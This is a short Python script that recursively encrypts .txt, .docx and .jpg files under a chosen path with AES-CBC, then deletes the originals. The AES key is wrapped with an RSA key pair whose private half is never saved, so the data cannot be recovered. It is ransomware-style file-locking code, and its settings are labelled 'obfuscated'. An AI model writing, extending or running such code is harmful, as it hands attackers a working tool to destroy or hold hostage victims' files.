import os, base64
from cryptography.hazmat.primitives import padding as pd, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms as algo, modes as md
from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_pd
from cryptography.hazmat.backends import default_backend

# --- Obfuscated settings ---
X = ('.txt', '.docx', '.jpg')  # File extensions
Y = True  # Use RSA

# --- Generate and optionally encode AES key ---
K = os.urandom(32)  # AES key
if Y:
    P = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    Q = P.public_key()
    E = Q.encrypt(
        K,
        rsa_pd.OAEP(
            mgf=rsa_pd.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(), label=None
        )
    )
    with open("key.bin", "wb") as F:
        F.write(base64.b64encode(E))  # Save encrypted key in base64
else:
    with open("key.bin", "wb") as F:
        F.write(base64.b64encode(K))  # Save raw key in base64

# --- Encrypt files and base64-encode data ---
D = input("Path: ")
for R, _, Z in os.walk(D):
    for N in Z:
        if N.endswith(X):
            PTH = os.path.join(R, N)
            with open(PTH, 'rb') as F:
                RAW = F.read()

            PAD = pd.PKCS7(128).padder()
            RAW = PAD.update(RAW) + PAD.finalize()
            IV = os.urandom(16)

            C = Cipher(algo.AES(K), md.CBC(IV), backend=default_backend())
            ENC = C.encryptor().update(RAW) + C.encryptor().finalize()
            FULL = IV + ENC

            with open(PTH + ".enc", 'wb') as F:
                F.write(base64.b64encode(FULL))  # Store encrypted data base64-encoded
            os.remove(PTH)
